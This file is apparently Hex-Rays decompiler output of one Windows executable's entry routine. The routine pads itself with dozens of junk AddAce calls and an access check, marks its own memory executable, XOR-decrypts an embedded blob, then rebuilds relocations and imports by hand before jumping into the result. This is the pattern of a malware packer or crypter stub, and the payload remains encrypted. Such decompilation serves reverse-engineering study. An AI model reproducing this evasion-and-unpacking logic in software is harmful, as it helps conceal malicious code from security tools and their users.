/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn start(int a1@<ebx>);
// BOOL __stdcall AreAnyAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// BOOL __stdcall AddAce(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

char byte_401490[] = { 'E' }; // weak
_UNKNOWN loc_401C60; // weak
int dword_402770[164] =
{
  1372917543,
  -1061833858,
  301751183,
  -1421424050,
  -1525844859,
  -689994575,
  -1125247706,
  -787047063,
  1071179048,
  991244641,
  -2022283877,
  1597830493,
  -824634018,
  1900785471,
  -2129551169,
  296407728,
  -1719027683,
  -509880842,
  839400307,
  1722562635,
  -144341970,
  349986500,
  -1581854881,
  -1374716008,
  -571764832,
  -1220534577,
  -635005344,
  891809334,
  906968191,
  -1966118772,
  1347746259,
  -1053943227,
  2115936274,
  -1908625509,
  526376001,
  -1756776754,
  -322643145,
  1061434890,
  1804612890,
  -85161478,
  424235855,
  -1556102440,
  -1395229395,
  -553022137,
  -1242293224,
  -668363673,
  918940713,
  903495578,
  -2002359594,
  1379335098,
  -1011148766,
  1201840798,
  -1209629105,
  649586100,
  -1615086018,
  -406662205,
  880622905,
  1372917543,
  -1061833810,
  591096101,
  -1715930972,
  -1773189214,
  -442451994,
  -1891752265,
  -489967937,
  204068558,
  254215529,
  -1280421419,
  1764081845,
  -123460805,
  1201838520,
  -1209625009,
  649586080,
  -1363177666,
  -691084597,
  90770473,
  1372917543,
  -1061833810,
  591096101,
  -1715930972,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_404000[4096] =
{
  'Î',
  'Ö',
  ')',
  '\f',
  'i',
  '\x05',
  '\'',
  '\x0F',
  'Õ',
  'Q',
  '®',
  '³',
  'µ',
  'À',
  '%',
  'i',
  ';',
  '#',
  '¤',
  'ø',
  '¸',
  '™',
  '¢',
  'G',
  'O',
  '–',
  'æ',
  '·',
  ' ',
  'å',
  '·',
  '&',
  '>',
  '\x8F',
  '¿',
  '®',
  'Ë',
  'â',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
void __usercall __noreturn start(int a1@<ebx>)
{
  int v1; // ebp
  int v2; // esi
  int v3; // esi
  int v4; // esi
  int v5; // esi
  int v6; // esi
  int v7; // esi
  int v8; // esi
  int v9; // esi
  int v10; // esi
  int v11; // esi
  int v12; // esi
  int v13; // esi
  int v14; // esi
  int v15; // esi
  int v16; // esi
  int v17; // esi
  int v18; // esi
  int v19; // esi
  int v20; // esi
  int v21; // esi
  int v22; // esi
  int v23; // esi
  int v24; // esi
  int v25; // esi
  int v26; // esi
  int v27; // esi
  int v28; // esi
  int v29; // esi
  int v30; // esi
  int v31; // esi
  int v32; // esi
  int v33; // esi
  int v34; // esi
  int v35; // esi
  int v36; // esi
  int v37; // esi
  int v38; // esi
  int v39; // esi
  int v40; // esi
  int v41; // esi
  int v42; // esi
  int v43; // esi
  int v44; // esi
  int v45; // esi
  int v46; // esi
  int v47; // esi
  int v48; // esi
  int v49; // esi
  int v50; // esi
  int v51; // esi
  int v52; // esi
  int v53; // esi
  int v54; // esi
  int v55; // esi
  int v56; // esi
  int v57; // esi
  int v58; // esi
  int v59; // esi
  int v60; // esi
  int v61; // esi
  int v62; // esi
  int v63; // esi
  int v64; // esi
  int v65; // esi
  int v66; // esi
  int v67; // esi
  int v68; // esi
  int v69; // esi
  int v70; // esi
  int v71; // esi
  int v72; // esi
  int v73; // esi
  int v74; // esi
  int v75; // esi
  int v76; // esi
  int v77; // esi
  int v78; // esi
  int v79; // esi
  int v80; // esi
  unsigned int v81; // esi
  unsigned int v82; // eax
  int *v83; // ecx
  char *v84; // ebp
  _WORD *v85; // edx
  int v86; // eax
  char *v87; // edi
  int v88; // esi
  HMODULE v89; // eax
  int *v90; // ebp
  int v91; // ecx
  FARPROC v92; // eax
  bool v93; // zf
  DWORD flOldProtect; // [esp+10h] [ebp-10h] BYREF
  char *v95; // [esp+14h] [ebp-Ch]
  char *v96; // [esp+18h] [ebp-8h]
  HMODULE v97; // [esp+1Ch] [ebp-4h]

  v1 = 0;
  v2 = AddAce(0, 0, 0, 0, 0) + 38;
  v3 = AddAce(0, 0, 0, 0, 0) + v2;
  v4 = AddAce(0, 0, 0, 0, 0) + v3;
  v5 = AddAce(0, 0, 0, 0, 0) + v4;
  v6 = AddAce(0, 0, 0, 0, 0) + v5;
  v7 = AddAce(0, 0, 0, 0, 0) + v6;
  v8 = AddAce(0, 0, 0, 0, 0) + v7;
  v9 = AddAce(0, 0, 0, 0, 0) + v8;
  v10 = AddAce(0, 0, 0, 0, 0) + v9;
  v11 = AddAce(0, 0, 0, 0, 0) + v10;
  v12 = AddAce(0, 0, 0, 0, 0) + v11;
  v13 = AddAce(0, 0, 0, 0, 0) + v12;
  v14 = AddAce(0, 0, 0, 0, 0) + v13;
  v15 = AddAce(0, 0, 0, 0, 0) + v14;
  v16 = AddAce(0, 0, 0, 0, 0) + v15;
  v17 = AddAce(0, 0, 0, 0, 0) + v16;
  v18 = AddAce(0, 0, 0, 0, 0) + v17;
  v19 = AddAce(0, 0, 0, 0, 0) + v18;
  v20 = AddAce(0, 0, 0, 0, 0) + v19;
  v21 = AddAce(0, 0, 0, 0, 0) + v20;
  v22 = AddAce(0, 0, 0, 0, 0) + v21;
  v23 = AddAce(0, 0, 0, 0, 0) + v22;
  v24 = AddAce(0, 0, 0, 0, 0) + v23;
  v25 = AddAce(0, 0, 0, 0, 0) + v24;
  v26 = AddAce(0, 0, 0, 0, 0) + v25;
  v27 = AddAce(0, 0, 0, 0, 0) + v26;
  v28 = AddAce(0, 0, 0, 0, 0) + v27;
  v29 = AddAce(0, 0, 0, 0, 0) + v28;
  v30 = AddAce(0, 0, 0, 0, 0) + v29;
  v31 = AddAce(0, 0, 0, 0, 0) + v30;
  v32 = AddAce(0, 0, 0, 0, 0) + v31;
  v33 = AddAce(0, 0, 0, 0, 0) + v32;
  v34 = AddAce(0, 0, 0, 0, 0) + v33;
  v35 = AddAce(0, 0, 0, 0, 0) + v34;
  v36 = AddAce(0, 0, 0, 0, 0) + v35;
  v37 = AddAce(0, 0, 0, 0, 0) + v36;
  v38 = AddAce(0, 0, 0, 0, 0) + v37;
  v39 = AddAce(0, 0, 0, 0, 0) + v38;
  v40 = AddAce(0, 0, 0, 0, 0) + v39;
  v41 = AddAce(0, 0, 0, 0, 0) + v40;
  v42 = AddAce(0, 0, 0, 0, 0) + v41;
  v43 = AddAce(0, 0, 0, 0, 0) + v42;
  v44 = AddAce(0, 0, 0, 0, 0) + v43;
  v45 = AddAce(0, 0, 0, 0, 0) + v44;
  v46 = AddAce(0, 0, 0, 0, 0) + v45;
  v47 = AddAce(0, 0, 0, 0, 0) + v46;
  v48 = AddAce(0, 0, 0, 0, 0) + v47;
  v49 = AddAce(0, 0, 0, 0, 0) + v48;
  v50 = AddAce(0, 0, 0, 0, 0) + v49;
  v51 = AddAce(0, 0, 0, 0, 0) + v50;
  v52 = AddAce(0, 0, 0, 0, 0) + v51;
  v53 = AddAce(0, 0, 0, 0, 0) + v52;
  v54 = AddAce(0, 0, 0, 0, 0) + v53;
  v55 = AddAce(0, 0, 0, 0, 0) + v54;
  v56 = AddAce(0, 0, 0, 0, 0) + v55;
  v57 = AddAce(0, 0, 0, 0, 0) + v56;
  v58 = AddAce(0, 0, 0, 0, 0) + v57;
  v59 = AddAce(0, 0, 0, 0, 0) + v58;
  v60 = AddAce(0, 0, 0, 0, 0) + v59;
  v61 = AddAce(0, 0, 0, 0, 0) + v60;
  v62 = AddAce(0, 0, 0, 0, 0) + v61;
  v63 = AddAce(0, 0, 0, 0, 0) + v62;
  v64 = AddAce(0, 0, 0, 0, 0) + v63;
  v65 = AddAce(0, 0, 0, 0, 0) + v64;
  v66 = AddAce(0, 0, 0, 0, 0) + v65;
  v67 = AddAce(0, 0, 0, 0, 0) + v66;
  v68 = AddAce(0, 0, 0, 0, 0) + v67;
  v69 = AddAce(0, 0, 0, 0, 0) + v68;
  v70 = AddAce(0, 0, 0, 0, 0) + v69;
  v71 = AddAce(0, 0, 0, 0, 0) + v70;
  v72 = AddAce(0, 0, 0, 0, 0) + v71;
  v73 = AddAce(0, 0, 0, 0, 0) + v72;
  v74 = AddAce(0, 0, 0, 0, 0) + v73;
  v75 = AddAce(0, 0, 0, 0, 0) + v74;
  v76 = AddAce(0, 0, 0, 0, 0) + v75;
  v77 = AddAce(0, 0, 0, 0, 0) + v76;
  v78 = AddAce(0, 0, 0, 0, 0) + v77;
  v79 = AddAce(0, 0, 0, 0, 0) + v78;
  v80 = AddAce(0, 0, 0, 0, 0) + v79;
  v81 = AddAce(0, 0, 0, 0, 0) + v80;
  if ( !AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v81 -= 34;
  VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
  v82 = 0;
  while ( 1 )
  {
    a1 *= 5;
    if ( v1 == v81 )
      v1 = 0;
    byte_401490[v82++] ^= byte_404000[v1++];
    if ( v82 >= 0x1420 )
    {
      v83 = dword_402770;
      v84 = &byte_401490[-640];
      v95 = &byte_401490[-640];
      v96 = 0;
      while ( 1 )
      {
        v85 = v83 + 2;
        if ( (unsigned int)(v83[1] - 8) >> 1 )
        {
          v81 = (unsigned int)(v83[1] - 8) >> 1;
          do
          {
            a1 = *v85 & 0xF000;
            if ( a1 == 12288 )
              *(_DWORD *)&v84[*v83 + (*v85 & 0xFFF)] += &byte_401490[-268436096];
            ++v85;
            --v81;
          }
          while ( v81 );
        }
        v86 = v83[1];
        v83 = (int *)((char *)v83 + v86);
        v96 += v86;
        if ( (unsigned int)v96 >= 0xE4 )
        {
          v87 = &byte_401490[2780];
          v96 = &byte_401490[2780];
          v88 = 3 * v81;
          if ( *(_DWORD *)&byte_401490[2796] )
          {
            do
            {
              v89 = LoadLibraryA(&v84[*((_DWORD *)v87 + 3)]);
              v97 = v89;
              a1 = (int)v83 + 2 * a1;
              if ( v89 )
              {
                v83 = *(int **)v87;
                if ( !*(_DWORD *)v87 )
                  v83 = (int *)*((_DWORD *)v87 + 4);
                a1 = (int)&v95[*((_DWORD *)v87 + 4)];
                v90 = (int *)&v84[(_DWORD)v83];
                if ( *v90 )
                {
                  while ( 1 )
                  {
                    v88 += (int)v89;
                    v91 = *v90;
                    v92 = *v90 >= 0 ? GetProcAddress(v89, &v95[v91 + 2]) : GetProcAddress(
                                                                             v89,
                                                                             (LPCSTR)(unsigned __int16)v91);
                    *(_DWORD *)a1 = v92;
                    ++v90;
                    v87 += v88;
                    a1 += 4;
                    if ( !*v90 )
                      break;
                    v89 = v97;
                  }
                  v87 = v96;
                }
                v84 = v95;
              }
              v87 += 20;
              v93 = *((_DWORD *)v87 + 4) == 0;
              v96 = v87;
            }
            while ( !v93 );
          }
          ((void (__thiscall *)(int *))loc_401C60)(v83);
          ExitProcess(0);
        }
      }
    }
  }
}
// 4013D8: variable 'v83' is possibly undefined
// 402770: using guessed type int dword_402770[164];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
